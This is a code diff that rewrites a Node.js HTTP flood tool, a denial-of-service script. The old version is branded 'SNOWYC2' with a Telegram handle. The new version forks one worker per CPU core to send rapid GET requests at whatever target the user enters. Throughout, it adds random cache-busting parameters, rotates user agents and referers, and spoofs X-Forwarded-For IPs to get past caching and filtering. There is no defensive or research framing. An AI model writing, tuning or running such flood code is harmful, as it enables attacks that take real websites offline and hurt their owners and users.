@@ -1,184 +1,110 @@
-const axios = require('axios');
-const fs = require('fs');
+const cluster = require('cluster');
 const os = require('os');
 const http = require('http');
 const https = require('https');
-const process = require('process');
+const fs = require('fs');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540); // adjust if needed
-const REQUEST_TIMEOUT = 8000;
+const CORES = os.cpus().length;
+const MAX_REQS_PER_THREAD = 5000;
+const STREAMS = 8;
 
-function loadLines(filename) {
-    try {
-        return fs.readFileSync(filename, 'utf8')
-            .split('\n')
-            .map(line => line.trim())
-            .filter(line => line.length > 0);
-    } catch {
-        return [];
-    }
-}
+const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
+  .split('\n')
+  .map(u => u.trim())
+  .filter(Boolean);
 
-const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
+const REFERERS = fs.readFileSync('refs.txt', 'utf8')
+  .split('\n')
+  .map(r => r.trim())
+  .filter(Boolean);
 
-const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
+const getUA = () => {
+  const ua1 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
+  const ua2 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
+  return `${ua1}, ${ua2}`;
+};
 
-const keepAliveHttp = new http.Agent({ keepAlive: true });
-const keepAliveHttps = new https.Agent({ keepAlive: true });
+const getReferer = () => REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
 
-class AttackEngine {
-    constructor(target, duration) {
-        this.target = target;
-        this.duration = duration * 1000;
-        this.startTime = Date.now();
-        this.stats = {
-            total: 0,
-            success: 0,
-            errors: 0,
-            peakRps: 0
-        };
-        this.uaIndex = 0;
-        this.running = true;
-    }
+const makeRequest = (target, stats) => {
+  const url = new URL(target);
+  const isHttps = url.protocol === 'https:';
+  const mod = isHttps ? https : http;
+  const path = url.pathname + url.search + `?cb=${Math.random().toString(36).substring(2, 10)}`;
 
-    getRandomUA() {
-        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
-        return UA_POOL[this.uaIndex];
-    }
+  const headers = {
+    'User-Agent': getUA(),
+    'Referer': getReferer(),
+    'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.'),
+    'Accept': '*/*',
+    'Connection': 'keep-alive'
+  };
 
-    getRandomReferer() {
-        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
-    }
+  const options = {
+    hostname: url.hostname,
+    port: url.port || (isHttps ? 443 : 80),
+    path: path,
+    method: 'GET',
+    headers: headers,
+    agent: new (isHttps ? https.Agent : http.Agent)({ keepAlive: true })
+  };
 
-    async makeRequest() {
-        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
-        const headers = {
-            'User-Agent': this.getRandomUA(),
-            'Referer': this.getRandomReferer(),
-            'X-Forwarded-For': randomIP,
-            'X-Real-IP': randomIP,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        };
+  const req = mod.request(options, res => {
+    res.on('data', () => {});
+    res.on('end', () => stats.success++);
+  });
 
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+  req.on('error', () => stats.errors++);
+  req.end();
+  stats.total++;
+};
 
-        try {
-            const isHttps = this.target.startsWith('https');
-            const response = await axios.get(urlWithNoise, {
-                headers,
-                timeout: REQUEST_TIMEOUT,
-                httpAgent: keepAliveHttp,
-                httpsAgent: keepAliveHttps,
-                validateStatus: null
-            });
-            if (response.status === 200) {
-                this.stats.success++;
-                return;
-            }
-        } catch {
-            // ignored
-        }
+const fireStream = (target, stats) => {
+  for (let i = 0; i < STREAMS; i++) {
+    makeRequest(target, stats);
+  }
+};
 
-        this.stats.errors++;
-    }
+if (cluster.isMaster) {
+  const readline = require('readline').createInterface({
+    input: process.stdin,
+    output: process.stdout
+  });
 
-    async startWorkers() {
-        const workers = [];
-        for (let i = 0; i < MAX_CONCURRENT; i++) {
-            workers.push(this.workerLoop());
-        }
-        await Promise.all(workers);
-    }
+  const ask = q => new Promise(resolve => readline.question(q, resolve));
 
-    async workerLoop() {
-        while (this.running && Date.now() - this.startTime < this.duration) {
-            this.stats.total++;
-            await this.makeRequest();
-        }
-    }
-
-    async runAttack() {
-        const showIntro = () => {
-            console.clear();
-            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
-            console.log('  ============================================');
-            console.log(`  TARGET: ${this.target}`);
-            console.log(`  TIME:   ${this.duration / 1000}s`);
-            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
-            console.log('  ============================================\n');
-        };
-
-        showIntro();
-
-        let lastTotal = 0;
-        const printStats = setInterval(() => {
-            const elapsed = (Date.now() - this.startTime) / 1000;
-            const currentRps = (this.stats.total - lastTotal) / 0.2;
-            lastTotal = this.stats.total;
-            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
-
-            process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
-            );
-        }, 200);
-
-        await this.startWorkers();
-        this.running = false;
-        clearInterval(printStats);
-        this.printSummary();
-    }
-
-    printSummary() {
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        const avgRps = this.stats.total / elapsed;
-        console.log('\n\n  ATTACK FINISHED');
-        console.log('  ============================================');
-        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
-        console.log(`  TOTAL:       ${this.stats.total}`);
-        console.log(`  SUCCESS:     ${this.stats.success}`);
-        console.log(`  ERRORS:      ${this.stats.errors}`);
-        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
-        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
-        console.log('  ============================================\n');
-    }
-}
-
-// Main
-(async () => {
-    const readline = require('readline').createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-
-    const ask = (q) => new Promise(resolve => readline.question(q, resolve));
-
+  (async () => {
     const targetInput = await ask("TARGET: ");
     let target = targetInput.trim();
-    if (!target.startsWith("http")) {
-        target = "http://" + target;
-    }
-
+    if (!target.startsWith('http')) target = 'http://' + target;
     const durationInput = await ask("TIME: ");
     readline.close();
 
     const duration = parseInt(durationInput);
-    if (isNaN(duration)) {
-        console.log("Invalid time input.");
-        return;
-    }
+    if (isNaN(duration)) return console.log("Invalid duration");
 
-    const engine = new AttackEngine(target, duration);
-    try {
-        await engine.runAttack();
-    } catch (err) {
-        console.error("Attack failed:", err.message);
+    console.log(`\nRUNNING ON ${CORES} CORES FOR ${duration}s\n`);
+
+    for (let i = 0; i < CORES; i++) {
+      cluster.fork({ TARGET: target, TIME: duration });
     }
-})();
+  })();
+
+} else {
+  const target = process.env.TARGET;
+  const end = Date.now() + parseInt(process.env.TIME) * 1000;
+  const stats = { total: 0, success: 0, errors: 0 };
+  let sent = 0;
+
+  const loop = () => {
+    if (Date.now() >= end || sent >= MAX_REQS_PER_THREAD) {
+      console.log(`Thread ${process.pid} done | Sent: ${stats.total} | 200: ${stats.success} | Errors: ${stats.errors}`);
+      process.exit(0);
+    }
+    fireStream(target, stats);
+    sent += STREAMS;
+    setImmediate(loop);
+  };
+
+  loop();
+}
